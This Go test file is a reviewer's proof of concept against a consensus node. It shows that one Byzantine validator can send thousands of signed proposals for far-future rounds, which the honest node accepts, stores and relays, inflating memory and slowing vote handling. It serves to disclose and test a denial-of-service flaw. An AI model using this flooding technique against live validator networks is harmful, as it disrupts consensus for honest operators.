package node

import (
	"crypto/sha256"
	"encoding/binary"
	"runtime"
	"testing"
	"time"

	"github.com/eval-apply-labs/go-ledger/consensus"
	"github.com/eval-apply-labs/go-ledger/ledger"
	"github.com/eval-apply-labs/go-ledger/signing"
)

// PoC (critic, round 2): proposals are not bounded by maxRoundLookahead. ReceiveVote rejects rounds
// beyond d.round+256, but onProposal/Driver.ReceiveProposal accept ANY round for which the signer is the
// scheduled proposer (ProposerAt is defined for every int32 round). One Byzantine validator (1 of 4)
// can therefore make an honest node allocate per-round VoteSets, store a block body per round in
// n.blocks/heightProposals (even an invalid body), and relay each one — all within a single height —
// and every subsequent vote then pays an O(rounds) evaluate (sorted precommit scan + skip scan).
func TestPoCCriticProposalRoundsUnbounded(t *testing.T) {
	scheme, network := signing.Ed25519{}, "testnet"
	signers := make([]*signing.Signer, 4)
	vals := make([]consensus.Validator, 4)
	for i := range signers {
		signers[i], _ = signing.Generate(scheme, network)
		vals[i] = consensus.Validator{PublicKey: signers[i].PublicKeyBase64(), Power: 1}
	}
	vs := consensus.NewValidatorSet(vals)
	victim, attacker := signers[0], signers[3]
	nd := New(Config{
		NetworkID: network, Scheme: scheme, Signer: victim, Validators: vs,
		TransactionCost: rat("0.1"), Timeout: time.Hour,
		Genesis: []ledger.Account{{PublicKey: victim.PublicKeyBase64(), Amount: rat("100"), ValidatorNode: victim.PublicKeyBase64()}},
	}, NewHTTPTransport(nil)) // no peers: relay is a no-op here; driven by hand, not Start()ed
	nd.startHeight()

	// Cost of one honest peer vote BEFORE the attack.
	voter := signers[1]
	measureVote := func(round int32) time.Duration {
		v, _ := consensus.SignVote(voter, consensus.Vote{Height: 1, Round: round, Type: consensus.Prevote, Validator: voter.PublicKeyBase64()})
		start := time.Now()
		nd.handle(event{kind: evVote, vote: &v})
		return time.Since(start)
	}
	before := measureVote(0)

	var m0 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m0)

	const want = 20000
	body := make([]ledger.Payment, 200) // a junk body (each proposal may carry up to ~1 MiB over HTTP)
	accepted := 0
	for r := int32(1000); accepted < want; r++ {
		if vs.ProposerAt(1, r) != attacker.PublicKeyBase64() {
			continue
		}
		var d [32]byte
		var rb [4]byte
		binary.BigEndian.PutUint32(rb[:], uint32(r))
		d = sha256.Sum256(rb[:])
		p := ProposalMsg{Height: 1, Round: r, ValidRound: -1, Block: ledger.Block{Height: 1, StateDigest: d, Payments: body}}
		if err := SignProposal(attacker, &p); err != nil {
			t.Fatal(err)
		}
		if nd.onProposal(p) { // returns true == "authentic: relay it"
			accepted++
		}
	}
	runtime.GC()
	var m1 runtime.MemStats
	runtime.ReadMemStats(&m1)
	after := measureVote(1)

	t.Logf("far-future-round proposals accepted (and marked for relay): %d (rounds 1000..), driver round still %d", accepted, nd.driver.Round())
	t.Logf("n.blocks=%d heightProposals=%d, live heap grew by %.1f MiB", len(nd.blocks), len(nd.heightProposals), float64(int64(m1.HeapAlloc)-int64(m0.HeapAlloc))/(1<<20))
	t.Logf("one honest vote: %v before, %v after", before, after)
	if accepted == want {
		t.Errorf("UNBOUNDED: %d proposals for rounds far beyond d.round+256 were accepted, stored and relayed within one height", accepted)
	}
}
